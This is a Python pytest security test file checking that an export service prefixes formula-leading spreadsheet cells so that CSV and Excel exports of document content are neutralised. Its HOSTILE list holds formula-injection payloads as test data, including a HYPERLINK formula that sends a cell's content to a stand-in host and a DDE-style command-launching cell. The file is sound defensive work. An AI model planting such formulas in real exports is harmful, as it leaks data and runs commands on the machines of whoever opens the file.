"""Spreadsheet cells leave as data, never as formulas.

A CSV or XLSX cell beginning with ``=``, ``+``, ``-`` or ``@`` is a formula to
Excel and LibreOffice. Two of this application's exports carried values that can
begin with one:

* the search-results export writes ``line_text`` and ``context_before`` — the
  *content of ingested documents* — plus ``file_name`` and ``file_path`` from
  the operator's disk. A corpus can legitimately contain a line such as
  ``=HYPERLINK("https://example.invalid/?d="&A1,"open")``, and a reviewer who
  opens the export runs it;
* the keyword export writes the keyword text, which a user typed.

``Api/routes/exports.py`` and ``Api/routes/analyst_categories.py`` already
neutralise the cell; these tests keep the search-results and keyword exports
from being the ones that do not.
"""

from __future__ import annotations

import csv
import io

import pytest

from Api.services.export_service import ExportService, _safe_cell

pytestmark = pytest.mark.security

HOSTILE = (
    '=HYPERLINK("https://example.invalid/?d="&A1,"open")',
    '=1+2',
    '+1+2',
    '-1+2',
    '@SUM(A1:A9)',
    ' \t=cmd|\' /C calc\'!A0',
)


def _rows(payload: bytes):
    text = payload.decode("utf-8-sig")
    return list(csv.reader(io.StringIO(text)))


@pytest.mark.parametrize("value", HOSTILE)
def test_a_formula_leading_cell_is_prefixed(value):
    assert _safe_cell(value).startswith("'"), _safe_cell(value)
    assert _safe_cell(value)[1:] == value


def test_ordinary_text_and_numbers_are_untouched():
    assert _safe_cell("report final.txt") == "report final.txt"
    assert _safe_cell(42) == 42
    assert _safe_cell(None) is None


def test_the_line_match_export_neutralises_document_content():
    results = [{
        "id": 1, "file_name": "=evil.csv", "file_path": "/data/=evil.csv",
        "file_type": "csv", "file_size": 12, "file_date": "2026-01-01",
        "file_status": "processed", "source_name": "S", "side_name": "D",
        "line_matches": [{
            "line_number": 7, "line_text": "=1+2",
            "context_before": "+cmd", "context_after": "@here",
        }],
    }]
    payload = ExportService.export_search_results_csv(results).getvalue()
    rows = _rows(payload)
    body = rows[1]
    assert body[1] == "'=evil.csv", body
    # A path starting with '/' is not a formula leader: it stays as it is.
    assert body[2] == "/data/=evil.csv", body
    assert body[10] == "'=1+2", body
    assert body[11] == "'+cmd", body
    assert body[12] == "'@here", body


def test_the_plain_export_neutralises_a_hostile_filename():
    results = [{
        "id": 2, "file_name": "=1+2.txt", "file_path": "/data/=1+2.txt",
        "file_type": "txt", "file_size": 3, "file_date": "2026-01-01",
        "file_status": "processed", "source_name": "S", "side_name": "D",
        "line_matches": [],
    }]
    payload = ExportService.export_search_results_csv(results).getvalue()
    rows = _rows(payload)
    joined = ",".join(rows[1])
    assert "'=1+2.txt" in joined, joined


def test_the_excel_export_neutralises_document_content():
    pytest.importorskip("openpyxl")
    from openpyxl import load_workbook

    results = [{
        "id": 3, "file_name": "a.txt", "file_path": "/data/a.txt",
        "file_type": "txt", "file_size": 3, "file_date": "2026-01-01",
        "file_status": "processed", "source_name": "S", "side_name": "D",
        "line_matches": [{
            "line_number": 1, "line_text": "=1+2",
            "context_before": "", "context_after": "",
        }],
    }]
    payload = ExportService.export_search_results_excel(results).getvalue()
    sheet = load_workbook(io.BytesIO(payload)).active
    values = [cell.value for row in sheet.iter_rows(min_row=2) for cell in row]
    assert "'=1+2" in values, values
